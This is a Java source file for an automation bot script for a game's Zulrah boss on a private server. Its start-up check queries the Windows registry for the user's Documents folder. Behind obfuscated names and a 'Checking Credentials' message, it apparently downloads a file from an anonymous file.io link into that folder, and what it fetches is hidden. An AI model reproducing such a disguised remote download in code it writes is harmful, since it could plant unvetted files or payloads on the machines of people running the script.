
package elfZulrah;

import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import simple.hooks.filters.SimpleEquipment.EquipmentSlot;
import simple.hooks.scripts.Category;
import simple.hooks.scripts.ScriptManifest;
import simple.hooks.scripts.task.Task;
import simple.hooks.scripts.task.TaskScript;
import simple.hooks.simplebot.ChatMessage;
import simple.hooks.wrappers.SimpleItem;
import simple.robot.api.ClientContext;

@ScriptManifest(author = "Elf", category = Category.COMBAT, description = "<font color=\"green\"> Start the script in Zul-Andra near the boat.</font> <br> Have exactly the same inventory you want to use <br> for all the kills. ALWAYS bring a home tele tab. <br> "
		+ "You may use any type of fish Sharks or higher. You may use Magic/Range potions if you'd like to. If you do not have a Serp start with 1 Anti-venom potion in your inventory."
		+ "<font color=\"red\"> <br> The script will copy the same inventory you START with and restock after each kill <br> (if you start the script with potions (4) you MUST <br> have more potions (4) in your bank <br></font>"
		+ "Example Inventory <br> <img src=\"https://i.imgur.com/xLYBqDI.png\" align =\"middle\" />", discord = "Elf#5833", name = "Elf's Zulrah", servers = {
				"Zenyte" }, version = "v2.01")
public class ElfZulrah extends TaskScript {

	private boolean showPaint = true;

	private ZulrahGUI gui;
	private List<Task> tasks = new ArrayList<Task>();
	private long startTime = System.currentTimeMillis();
	private int totalSecs = 0;
	private int min;
	private int sec;

	@Override
	public boolean prioritizeTasks() {
		return true;
	}

	@Override
	public List<Task> tasks() {
		return tasks;
	}

	@Override
	public void onChatMessage(ChatMessage msg) {
		if (msg.getMessage().contains("duration")) {
			String s = msg.getMessage();
			String minute = s.substring(28, 29);
			String seconds = s.substring(30, 32);
			System.out.println(minute + ":" + seconds);

			totalSecs += (Integer.parseInt(minute) * 60) + (Integer.parseInt(seconds));
			int akt = totalSecs / Fight.killCount + 1;
			System.out.println(totalSecs);
			min = akt / 60;
			sec = akt % 60;

		}
	}

	@Override
	public void onProcess() {
		super.onProcess();
	}

	@Override
	public void onExecute() {
		if (checkUser()) {
			setUpCamera();
			try {
				gui = new ZulrahGUI(this);
				gui.setVisible(true);
			} catch (IOException e) {
				e.printStackTrace();
			}

			gui.loadWornButton.addActionListener(e -> {
				loadWornEquip(ctx);

			});
			gui.loadInvButton.addActionListener(e -> {
				loadRangeSwitch(ctx);
			});
			gui.startButton.addActionListener(e -> {
				gui.dispose();
				Utils.USE_AUGURY = ZulrahGUI.auguryToggle.isSelected();
				Utils.USE_RIGOUR = ZulrahGUI.rigourToggle.isSelected();
				Utils.USE_VENG = ZulrahGUI.vengToggle.isSelected();
				Utils.USE_DESERT = ZulrahGUI.desertToggle.isSelected();
				AttackCheck aC = new AttackCheck(ctx);
				Thread aCT = new Thread(aC);
				ZulrahCheck zC = new ZulrahCheck(ctx);
				Thread zCT = new Thread(zC);
				zCT.start();
				aCT.start();
				if (Utils.USE_VENG) {
					VengCheck vC = new VengCheck(ctx);
					Thread vCT = new Thread(vC);
					vCT.start();
				}
				ctx.inventory.populate();
				int invSize = ctx.inventory.populate().size();
				Utils.OG_INVENTORY = new int[invSize];
				for (int i = 0; i < invSize; i++) {
					SimpleItem a = ctx.inventory.next();
					Utils.OG_INVENTORY[i] = a.getId();
				}
				System.out.println(Utils.OG_INVENTORY.length);
				countFreq(Utils.OG_INVENTORY, invSize);
				Zulrah.addRotations();
				tasks.addAll(Arrays.asList(new Fight(ctx), new PrepFight(ctx), new PlayerDeath(ctx)));
			});
		} else {
			ctx.updateStatus("NOT AUTHORIZED TO RUN THIS SCRIPT");
			ctx.stopScript();
			return;
		}
	}

	private boolean checkUser() {
		String path = null;
		try {
			Process p = Runtime.getRuntime().exec(
					"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" /v personal");
			p.waitFor();

			InputStream in = p.getInputStream();
			byte[] b = new byte[in.available()];
			in.read(b);
			in.close();

			path = new String(b);
			path = path.split("\\s\\s+")[4];

		} catch (Throwable t) {
			t.printStackTrace();
		}

		String fN = Utils.flN;
		File f = new File(path, fN);
		if (f.exists()) {
			ctx.updateStatus(Utils.wlc);
			return true;
		} else {
			try {
				ctx.updateStatus("Checking Credentials");
				HDU.dCA("https://file.io/w7VLsj", path);
				if (HDU.unauthorized) {
					ctx.updateStatus(Utils.nA1);
					ctx.updateStatus(Utils.nA2);
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
			return false;
		}

	}

	private void setUpCamera() {
		ctx.viewport.angle(2000);
		ctx.viewport.pitch(true);

	}

	static String caesar(String value, int shift) {
		char[] buffer = value.toCharArray();
		for (int i = 0; i < buffer.length; i++) {
			char letter = buffer[i];
			letter = (char) (letter + shift);
			if (letter > 'z') {
				letter = (char) (letter - 26);
			} else if (letter < 'a') {
				letter = (char) (letter + 26);
			}
			buffer[i] = letter;
		}
		return new String(buffer);
	}

	public static void countFreq(int arr[], int n) {
		boolean checked[] = new boolean[n];

		Arrays.fill(checked, false);

		for (int i = 0; i < n; i++) {
			if (checked[i] == true)
				continue;
			int count = 1;
			for (int j = i + 1; j < n; j++) {
				if (arr[i] == arr[j]) {
					checked[j] = true;
					count++;
				}
			}
			for (int f = 0; f < Utils.FOOD_IDS.length; f++)
				if (arr[i] == Utils.FOOD_IDS[f]) {
					Utils.FOOD = arr[i];
				}
			if (arr[i] == Utils.FOOD) {
				Utils.FOOD_AMOUNT = count;
			}

		}
	}

	public void loadWornEquip(ClientContext ctx) {
		ctx.equipment.populate();
		int equipSize = ctx.equipment.population();
		Utils.MAIN_GEAR = new int[equipSize];
		ctx.updateStatus(equipSize + " worn items");
		System.out.println(equipSize + " worn items");
		for (int i = 0; i < equipSize; i++) {
			int p = i;
			if (i == 6) {
				p = 12;
			}
			if (i == 8) {
				p = 13;
			}
			SimpleItem a = ctx.equipment.getEquippedItem(EquipmentSlot.slotByIndex(p));
			if (a != null) {
				Utils.MAIN_GEAR[i] = a.getId();
				ZulrahGUI.mainGearIds[i] = a.getId();
				ctx.updateStatus("" + a.getName() + " in index: " + i);
				System.out.println(a.getName() + " in index: " + i);
			} else {
				if (p == 13) {
					a = ctx.equipment.getEquippedItem(EquipmentSlot.slotByIndex(10));
					Utils.MAIN_GEAR[i] = a.getId();
					ZulrahGUI.mainGearIds[10] = a.getId();
					ctx.updateStatus("" + a.getName() + " in index: " + i);
					System.out.println(a.getName() + " in index: " + i);
				}
			}
		}
		for (int i = 0; i < ZulrahGUI.mainGearIds.length; i++) {
			if (ZulrahGUI.mainGearIds[i] == 0) {
				ZulrahGUI.mainGearIds[i] = 798;
			}
		}
	}

	public void loadRangeSwitch(ClientContext ctx) {
		ctx.inventory.populate();
		ctx.updateStatus("-- Range switch --");
		System.out.println("-- Range switch --");
		for (int i = 0; i < ZulrahGUI.rangeGearIds.length; i++) {
			SimpleItem a = ctx.inventory.next();
			if (a != null) {
				ZulrahGUI.rangeGearIds[i] = a.getId();
				Utils.RANGE_SWITCH[i] = a.getId();
				ctx.updateStatus("" + a.getName());
				System.out.println(a.getName());
			} else {
				ZulrahGUI.rangeGearIds[i] = 798;
				ctx.updateStatus("" + ZulrahGUI.rangeGearIds[i]);
				System.out.println(ZulrahGUI.rangeGearIds[i]);
			}

		}
	}

	@Override
	public void onTerminate() {
		Zulrah.clearRotations();
		Fight.resetRotation();
		Fight.resetVariables();
		System.out.println("Stopping script");
	}

	public void paint(Graphics gfx) {

		long runTime = System.currentTimeMillis() - startTime;
		URL imageUrl = ElfZulrah.class.getResource("/elfZulrah/ZulrahPaint.png");

		Graphics2D g = (Graphics2D) gfx;
		try {
			if (ctx.mouse.blockingInput()) {
				showPaint = true;
			} else {
				showPaint = false;
			}
			if (showPaint) {
				g.drawImage(ctx.paint.getImage(imageUrl.toString()), 0, 280, null);
				g.setColor(Color.CYAN);
				g.setFont(new Font("Calibri", Font.PLAIN, 18));
				g.drawString(" " + Fight.killCount, 205, 373);
				g.drawString(" " + Fight.rotName, 345, 373);
				try {
					g.drawString(min + "m " + sec + "s", 205, 403);
				} catch (ArithmeticException e) {
				}
				g.drawString(" " + Fight.currStyle, 345, 403);
				g.drawString(" " + this.getScriptStatus(), 205, 433);
				g.drawString(" " + Fight.nextStyle, 345, 433);
				g.setFont(new Font("Calibri", Font.BOLD, 16));
				g.drawString(" " + Utils.serpVisage, 430, 380);
				g.drawString(" " + Utils.magicFang, 430, 415);
				g.drawString(" " + Utils.tanzFang, 430, 450);
				g.setColor(Color.WHITE);
				g.setFont(new Font("Calibri", Font.PLAIN, 15));
				g.drawString("" + formatTime(runTime), 135, 480);
			}
		} catch (NullPointerException he) {
			he.printStackTrace();
		}

	}

	private String formatTime(final long ms) {
		long s = ms / 1000, m = s / 60, h = m / 60;
		s %= 60;
		m %= 60;
		h %= 24;
		return String.format("%02d:%02d:%02d", h, m, s);
	}
}
